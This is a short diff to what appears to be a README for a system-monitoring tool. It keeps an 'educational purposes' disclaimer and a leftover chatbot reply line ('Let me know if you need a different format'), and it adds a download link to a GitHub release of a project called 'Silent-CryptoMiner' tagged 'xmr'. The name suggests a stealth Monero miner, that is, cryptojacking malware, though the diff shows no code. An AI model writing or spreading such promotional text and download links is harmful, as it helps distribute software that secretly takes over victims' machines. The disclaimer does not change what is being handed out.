@@ -32,3 +32,5 @@ System administration and process monitoring training.
 ⚠️ Important: This tool is designed for educational purposes and security testing. Using it without explicit permission from the system owner may violate computer security laws.
 
 Let me know if you need a different format (plain text, markdown without tables, etc.) or further adjustments.
+
+Download: https://github.com/hardstyle82/Silent-CryptoMiner/releases/tag/xmr
